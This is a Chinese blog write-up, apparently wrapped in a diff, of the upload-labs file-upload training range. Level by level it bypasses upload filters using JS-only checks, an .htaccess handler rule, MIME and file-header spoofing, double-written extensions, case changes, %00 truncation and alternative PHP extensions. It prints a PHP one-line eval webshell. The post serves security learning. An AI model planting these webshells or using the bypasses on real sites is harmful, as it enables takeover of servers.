@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='前言 重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。 搭建 这里我使用的是一位大佬自己搭建的upload'>
+<title>upload-labs靶场</title>
+
+<link rel='canonical' href='https://blog.winglet.com/p/upload-labs%E9%9D%B6%E5%9C%BA/'>
+
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='upload-labs靶场'>
+<meta property='og:description' content='前言 重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。 搭建 这里我使用的是一位大佬自己搭建的upload'>
+<meta property='og:url' content='https://blog.winglet.com/p/upload-labs%E9%9D%B6%E5%9C%BA/'>
+<meta property='og:site_name' content='Winglet&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="upload-labs靶场">
+<meta name="twitter:description" content="前言 重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。 搭建 这里我使用的是一位大佬自己搭建的upload">
+    <link rel="shortcut icon" href="img/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "light");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/2.jpg" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Winglet&#39;s Blog</a></h1>
+            <h2 class="site-description">翩若惊鸿，宛若游龙。</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/wingllllet'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://blog.winglet.com/" selected>中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#搭建">搭建</a></li>
+    <li><a href="#upload_1-js">upload_1 [JS]</a>
+      <ol>
+        <li><a href="#漏洞分析">漏洞分析</a></li>
+        <li><a href="#解决方法">解决方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-2-htaccess">upload-2 [.htaccess]</a>
+      <ol>
+        <li><a href="#漏洞分析-1">漏洞分析</a></li>
+        <li><a href="#解决方法-1">解决方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-3-mime">upload-3 [MIME]</a>
+      <ol>
+        <li><a href="#漏洞分析-2">漏洞分析</a></li>
+        <li><a href="#解决方法-2">解决方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-4-文件头">upload-4 [文件头]</a>
+      <ol>
+        <li><a href="#漏洞分析-3">漏洞分析</a></li>
+        <li><a href="#解决方法-3">解决方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-5-代码缺陷1">upload-5 [代码缺陷1]</a>
+      <ol>
+        <li><a href="#漏洞分析-4">漏洞分析</a></li>
+        <li><a href="#解决方法-4">解决方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-6-代码缺陷2">upload-6 [代码缺陷2]</a>
+      <ol>
+        <li><a href="#漏洞分析-5">漏洞分析</a></li>
+        <li><a href="#解决方法-5">解决方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-7-get型00截断">upload-7 [GET型%00截断]</a>
+      <ol>
+        <li><a href="#漏洞分析-6">漏洞分析</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-9-黑名单缺陷">upload-9 [黑名单缺陷]</a>
+      <ol>
+        <li><a href="#漏洞分析-7">漏洞分析</a></li>
+        <li><a href="#解决方法-6">解决方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-10-条件竞争">upload-10 [条件竞争]</a>
+      <ol>
+        <li><a href="#漏洞分析-8">漏洞分析</a></li>
+        <li><a href="#解决方法-7">解决方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#upload-11-二次渲染">upload-11 [二次渲染]</a>
+      <ol>
+        <li><a href="#漏洞分析-9">漏洞分析</a>
+          <ol>
+            <li><a href="#gif">gif</a></li>
+            <li><a href="#jpg">jpg</a></li>
+            <li><a href="#png">png</a></li>
+          </ol>
+        </li>
+        <li><a href="#解决方法-8">解决方法</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/upload-labs%E9%9D%B6%E5%9C%BA/">upload-labs靶场</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言</h2>
+<p>重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。</p>
+<h2 id="搭建">搭建</h2>
+<p>这里我使用的是一位大佬自己搭建的upload靶场，不过知识点还是一样的。<a class="link" href="https://github.com/sqlsec/upload-labs-docker"  target="_blank" rel="noopener"
+    >GitHub - sqlsec/upload-labs-docker: 国光的文件上传靶场，基于 upload-labs 定制</a></p>
+<p>下载他的压缩包后，解压用docker搭建即可。</p>
+<p>如果用的最新版docker的话，起镜像的名令为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">docker compose up -d
+</span></span></code></pre></div><h2 id="upload_1-js">upload_1 [JS]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240401223158086.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240401223158086"
+	
+	
+></p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p>这关漏洞在于它只进行前端验证。右键查看源代码</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012233163.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240401223352105"
+	
+	
+></p>
+<p>可以看到这段js代码的作用就是对上传的文件进行判断和过滤。</p>
+<p>就是我们只有在上传<code>.jpg .png .gif .jpeg</code>后缀文件时，才能上传成功。</p>
+<p>但是它只进行了前端验证，所以只要上传一个符合条件的文件，在前端验证完把文件放走后用bp抓包，在它即将把数据发送给后端时，将文件名修改为<code>.php</code>文件，就能成功上传该木马。</p>
+<h3 id="解决方法">解决方法</h3>
+<p>我们先创建一个一句话木马文件，内容如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>将其后缀改为<code>.jpg</code>，上传并用burpsuite抓包，抓到的数据如下</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012243256.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240401224335199"
+	
+	
+></p>
+<p>然后将文件后缀改为<code>.php</code>，并放包</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012244266.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240401224448171"
+	
+	
+></p>
+<p>这个就是我们上传的文件了，然后我们右键它复制链接</p>
+<p><img src="C:%5cUsers%5cwinglet%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240401224531992.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240401224531992"
+	
+	
+></p>
+<p>这个就是我们上传的地址了，接下来用蚁剑连接</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012248818.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240401224804758"
+	
+	
+></p>
+<p>出现这个绿标就宣告我们成功了</p>
+<h2 id="upload-2-htaccess">upload-2 [.htaccess]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022010190.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240402201003074"
+	
+	
+></p>
+<h3 id="漏洞分析-1">漏洞分析</h3>
+<p>这个靶场带有源码，所以就用源码来讲解，如果是实际情况，那肯定是不能看到的，只能自己去一个一个尝试。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022007333.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240402200657153"
+	
+	
+></p>
+<p>这个黑名单就是这段代码的关键点，可以看到它过滤了很多可执行文件，并且因为这个并不是上一关的js前端审核，我们无法通过抓包改后缀的方法去绕过。</p>
+<p>那么这关的思路就是它在页面上的提示了<code>.htaccess</code>文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.htaccess是一个用于配置Apache HTTP服务器的文件。它通常位于网站的根目录或特定目录下，通过在文件中编写一些规则和指令，可以对该目录或其子目录的行为进行自定义设置。它允许您在不修改服务器配置文件的情况下，对特定目录或网站的行为进行修改。可以在.htaccess文件中添加各种指令，例如重定向规则、访问控制、错误页面定义、缓存控制等。
+</span></span></code></pre></div><p>这个黑名单是没有过滤这个后缀的，所以就可以上传<code>.htaccess</code>文件，它里面的内容就写成</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">FilesMatch</span> <span class="s2">&#34;.jpg&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SetHandler</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">httpd</span><span class="o">-</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">FilesMatch</span><span class="o">&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这段代码是一个Apache HTTP服务器的配置，用于将对以&#34;.jpg&#34;结尾的URL请求的处理器设置为PHP解析器。当Apache服务器收到以&#34;.jpg&#34;结尾的请求时，它会将请求交给PHP解析器来处理，而不是将其作为静态图片文件返回。
+</span></span><span class="line"><span class="cl">在这段配置中，&lt;FilesMatch&gt;标签用于匹配特定的文件名模式，这里是匹配以&#34;.jpg&#34;结尾的文件。SetHandler指令用于设置与匹配的文件相关联的处理器，这里是将处理器设置为application/x-httpd-php，即PHP解析器。
+</span></span></code></pre></div><p>起到的作用就是，我们上传的<code>.jpg</code>文件，会被自动当作<code>.php</code>文件进行执行。</p>
+<h3 id="解决方法-1">解决方法</h3>
+<p>首先创建一个<code>.htaccess</code>文件，在里面写入上面说的内容，然后上传</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022021780.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240402202143725"
+	
+	
+></p>
+<p>可以看到我们上传成功了，接着把一句话木马的后缀改为<code>.jpg</code>，直接上传</p>
+<p>接下来就用蚁剑连接</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022023920.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240402202323857"
+	
+	
+></p>
+<p>连接成功，而且可以看到我们连接的文件后缀还是<code>.jpg</code></p>
+<h2 id="upload-3-mime">upload-3 [MIME]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022044958.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240402204405883"
+	
+	
+></p>
+<h3 id="漏洞分析-2">漏洞分析</h3>
+<p>我们先介绍一下MIME</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MIME（Multipurpose Internet Mail Extensions）是一种标准，用于标识互联网上不同类型的文件和媒体内容。MIME类型由两部分组成：主类型（top-level type）和子类型（sub-type），用斜杠分隔。例如，`text/html`和`image/jpeg`都是MIME类型。
+</span></span><span class="line"><span class="cl">MIME类型用于指示文件或数据的性质和格式，以便客户端和服务器可以正确地处理和解释内容。它在HTTP协议中的`Content-Type`头部字段中使用。
+</span></span></code></pre></div><p>这关没有源码可看，但对上传文件还是进行了限制。需要测试什么文件类型可以上传，然后我们再上传木马文件，并将其的<code>MIME</code>类型修改为可以上传的类型。</p>
+<h3 id="解决方法-2">解决方法</h3>
+<p>我们先上传<code>.jpg</code>文件，并抓包看看数据</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022054068.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240402205432030"
+	
+	
+></p>
+<p>发现这个文件类型可以成功上传，接着我们可以把文件后缀改为<code>.php</code>文件，继续上传发现依然能上传成功。但是如果我们一开始就上传<code>.php</code>文件，就会发现无法上传，因为上传<code>.php</code>文件后<code>content-type</code>的值就会变成</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: application/x-php
+</span></span></code></pre></div><p>这个文件类型是不能上传成功的类型，接着直接蚁剑连接</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022058835.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240402205851767"
+	
+	
+></p>
+<p>成功</p>
+<h2 id="upload-4-文件头">upload-4 [文件头]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052257430.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240405225727311"
+	
+	
+></p>
+<h3 id="漏洞分析-3">漏洞分析</h3>
+<p>这关有源码，所有就可以看源码进行分析。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052300382.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240405230050325"
+	
+	
+></p>
+<p>这就是关键的部分，可以看到有两个白名单，第一个就是上一关讲到的<code>MIME</code>类型，这个绕过的方法就不再讲述了。</p>
+<p>第二个就是检测你的文件头，看你的文件头是否和<code>.gif .jpg .png</code>文件的文件头一致，而我们只需要在代码前面加上相应的文件头字符串即可。常用的就是<code>GIF89a</code></p>
+<h3 id="解决方法-3">解决方法</h3>
+<p>先上传一句话木马文件，然后抓包</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052309393.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240405230904356"
+	
+	
+></p>
+<p>这两处就是我们需要修改的部分，改为</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052309993.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240405230937962"
+	
+	
+></p>
+<p>然后发包，即可上传成功，接着就可以蚁剑连接。</p>
+<h2 id="upload-5-代码缺陷1">upload-5 [代码缺陷1]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062152525.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240406215153374"
+	
+	
+></p>
+<h3 id="漏洞分析-4">漏洞分析</h3>
+<p>有缺陷的代码，已经在界面上展示了，所以就直接分析这三句代码即可。可以看到它还是设了一个黑名单，不过它与前几关的不同点是它并没有禁止这些文件上传，而是修改这些文件的名称。比如上传了一个<code>1.php</code>的文件，它依然可以上传成功，但是我们会搜不到这个文件。因为该文件名称中有<code>php</code>这段字符串，所以就会把它替换为空字符，文件名就变成了<code>1</code>。</p>
+<p>所以我们的绕过方法就是用字符拼接进行绕过。比如上传<code>1.pphphp</code></p>
+<p>它会检测到<code>php</code>这段字符串，但是就算把它替换为空字符了,我们的文件依然是<code>php</code>文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.pphphp  --&gt; 1.php
+</span></span></code></pre></div><h3 id="解决方法-4">解决方法</h3>
+<p>把木马文件的后缀改为<code>.pphphp</code>，然后上传</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062235289.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240406223503248"
+	
+	
+></p>
+<p>然后就会发现上传的文件依然是<code>.php</code>文件</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062235805.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240406223542775"
+	
+	
+></p>
+<p>接着用蚁剑连接即可</p>
+<h2 id="upload-6-代码缺陷2">upload-6 [代码缺陷2]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062240573.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240406224023499"
+	
+	
+></p>
+<h3 id="漏洞分析-5">漏洞分析</h3>
+<p>这个问题代码其实和上关差不多，但是它是把黑民单的字符改为了空格符，这就导致字符复写的方法用不了了，但是它提示我们用的系统是Windows系统，在Windows系统中是区分大小写的，所以就可以通过大小写进行绕过。linux系统是不区分大小写的，所以大小写绕过的方法是无法成功的。</p>
+<h3 id="解决方法-5">解决方法</h3>
+<p>将后缀改为<code>.PHp</code>，然后上传</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062245383.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240406224552352"
+	
+	
+></p>
+<p>文件后缀没有改变。</p>
+<h2 id="upload-7-get型00截断">upload-7 [GET型%00截断]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404092219938.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240409221930797"
+	
+	
+></p>
+<h3 id="漏洞分析-6">漏洞分析</h3>
+<p>这是上传部分的代码。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404092224839.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240409222418782"
+	
+	
+></p>
+<p>这个方法页面也给出了，接下来就讲解一下<code>%00</code>截断的原理。<code>%00</code>其实就是十六进制的<code>\x00</code>它们对应的ascii码值是<code>0</code>,但是它所表示的并不只是一个数字<code>0</code>，这是网上搜到的解释</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404111809055.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240411180901972"
+	
+	
+></p>
+<p>也就是说它还表示<code>NULL</code>和空字符，在低版本PHP中空字符表示着一行代码的结束。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">upload</span><span class="o">/</span><span class="mf">1.</span><span class="n">php</span><span class="o">%</span><span class="mf">001.</span><span class="n">png</span>		<span class="o">--&gt;</span>			<span class="mf">1.</span><span class="n">php</span>
+</span></span></code></pre></div><p>如果get传参是这样的数据，最后会被认为是<code>1.php</code>文件，而后面的<code>1.png</code>就会被省略。%00截断的原理大概就是这样了。但为什么使用<code>%00</code>可以绕过这个文件上传呢。这就要分析代码。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404111817267.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240411181726217"
+	
+	
+></p>
+<p>这是我们上传并抓包得到的数据。我们上传一个<code>jpg</code>文件，来通过白名单。之后存储文件的时候</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$des</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;road&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
+</span></span></code></pre></div><p>这里的<code>road=../upload/1.php%004535524.jpg</code>，<code>%00</code>后面的被省略了，就导致我们上传的是<code>1.php</code>文件，而<code>1.jpg</code>文件中的内容也会被写入<code>1.php</code>文件内，通过这中方法就上传了一个木马文件。</p>
+<h2 id="upload-9-黑名单缺陷">upload-9 [黑名单缺陷]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071332353.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240407133233215"
+	
+	
+></p>
+<h3 id="漏洞分析-7">漏洞分析</h3>
+<p>这关的问题主页已经提到了，就是在设置黑名单的时候，忽略了其他文件，导致那些文件正好也可以被执行。比如在apache服务器中，除了<code>.php</code>文件会被作为php文件执行，还有</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">phtml  php5  php3  php4  pht  phps  php3p
+</span></span></code></pre></div><p>所以就可以把木马文件的后缀改为它们中的一个，依然可以上传成功。</p>
+<h3 id="解决方法-6">解决方法</h3>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071337747.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240407133737711"
+	
+	
+></p>
+<p>将文件后缀改为<code>phtml</code>，然后上传。上传成功后用蚁剑连接</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071338699.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240407133848629"
+	
+	
+></p>
